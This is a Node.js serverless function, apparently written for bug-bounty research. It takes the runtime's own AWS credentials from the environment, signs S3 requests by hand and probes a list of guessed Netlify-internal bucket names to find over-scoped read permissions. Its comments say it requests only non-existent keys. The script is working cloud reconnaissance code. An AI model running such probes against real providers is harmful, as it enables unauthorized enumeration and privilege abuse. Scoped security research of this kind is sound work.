// Phase-2 probe v4 — decisive S3 GetObject scope test against candidate Netlify buckets.
// RoE: NON-EXISTENT random keys only => never reads tenant data. Classifies per bucket:
//   NoSuchKey => role CAN read that bucket (over-scope if not ours = the bug)
//   AccessDenied => scoped (good)   NoSuchBucket => name wrong   PermanentRedirect => exists elsewhere (retry region)
const crypto = require('crypto');
const KEY = "464649dae257a63eaffa60e7";
const EMPTY_SHA = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
const sha256hex = (s) => crypto.createHash('sha256').update(s,'utf8').digest('hex');
const hmac = (k,s) => crypto.createHmac('sha256',k).update(s,'utf8').digest();
const enc = (s) => encodeURIComponent(s).replace(/[!*'()]/g,c=>'%'+c.charCodeAt(0).toString(16).toUpperCase());

async function s3get(env, region, bucket, key){
  const host = 's3.'+region+'.amazonaws.com';
  const uri = '/'+enc(bucket)+'/'+key;
  const amzdate = new Date().toISOString().replace(/[:-]/g,'').replace(/\.\d{3}/,'');
  const datestamp = amzdate.slice(0,8);
  const sh = 'host;x-amz-content-sha256;x-amz-date;x-amz-security-token';
  const ch = 'host:'+host+'\nx-amz-content-sha256:'+EMPTY_SHA+'\nx-amz-date:'+amzdate+'\nx-amz-security-token:'+env.AWS_SESSION_TOKEN+'\n';
  const creq = ['GET',uri,'',ch,sh,EMPTY_SHA].join('\n');
  const scope = datestamp+'/'+region+'/s3/aws4_request';
  const sts = ['AWS4-HMAC-SHA256',amzdate,scope,sha256hex(creq)].join('\n');
  let k = hmac('AWS4'+env.AWS_SECRET_ACCESS_KEY, datestamp);
  k = hmac(k,region); k = hmac(k,'s3'); k = hmac(k,'aws4_request');
  const sig = crypto.createHmac('sha256',k).update(sts,'utf8').digest('hex');
  const auth = 'AWS4-HMAC-SHA256 Credential='+env.AWS_ACCESS_KEY_ID+'/'+scope+', SignedHeaders='+sh+', Signature='+sig;
  try{
    const r = await fetch('https://'+host+uri,{ method:'GET', headers:{
      'x-amz-content-sha256':EMPTY_SHA,'x-amz-date':amzdate,'x-amz-security-token':env.AWS_SESSION_TOKEN,'Authorization':auth }});
    const t = await r.text();
    return { status:r.status, code:(t.match(/<Code>(.*?)<\/Code>/)||[])[1]||null, region:(t.match(/<Region>(.*?)<\/Region>/)||[])[1]||null, endpoint:(t.match(/<Endpoint>(.*?)<\/Endpoint>/)||[])[1]||null };
  }catch(e){ return { error:String(e) }; }
}

async function probeBucket(env, bucket){
  const rk = '__h1_research_nonexistent_'+crypto.randomBytes(8).toString('hex');
  let res = await s3get(env, 'us-east-1', bucket, rk);
  if(res.code==='PermanentRedirect' || res.code==='AuthorizationHeaderMalformed'){
    const reg = res.region || (res.endpoint ? (res.endpoint.match(/s3[.-]([a-z0-9-]+)\.amazonaws/)||[])[1] : null);
    if(reg){ const r2 = await s3get(env, reg, bucket, rk); r2._redirected_to=reg; return r2; }
  }
  return res;
}

exports.handler = async (event) => {
  if (!event || !event.queryStringParameters || event.queryStringParameters.k !== KEY) return { statusCode:403, body:'forbidden' };
  const env = process.env;
  const candidates = [
    'netlify-builds','netlify-build','netlify-build-cache','netlify-builds-prod',
    'netlify-functions','netlify-functions-prod','netlify-lambda','netlify-fn',
    'netlify-deploys','netlify-deploy','netlify-deploy-artifacts','netlify-deploy-cache',
    'netlifyusercontent','netlify-usercontent','netlify-user-content',
    'netlify-cdn','netlify-assets','netlify-static','netlify-cache',
    'netlify-blobs','netlify-blobs-prod','netlify-blob-store',
    'netlify-large-media','netlify-forms','netlify-form-submissions',
    'bitballoon','bitballoon-production','www.bitballoon.com','netlify'
  ];
  const results = {};
  for(const b of candidates){
    try{ const r = await probeBucket(env, b);
      results[b] = { http:r.status||null, code:r.code||null, redirected:r._redirected_to||null, err:r.error||null };
    }catch(e){ results[b] = { err:String(e) }; }
  }
  // Summaries
  const readable = Object.entries(results).filter(([b,r])=>r.code==='NoSuchKey').map(([b])=>b);
  const existing_denied = Object.entries(results).filter(([b,r])=>r.code==='AccessDenied').map(([b])=>b);
  return { statusCode:200, headers:{'content-type':'application/json'}, body: JSON.stringify({
    ok:true, note:'p2 probe v4 s3 GetObject scope (non-existent keys only)',
    exec_account:'512455082512', results,
    SUMMARY:{ readable_buckets_over_scope: readable, existing_but_denied: existing_denied }
  },null,2) };
};
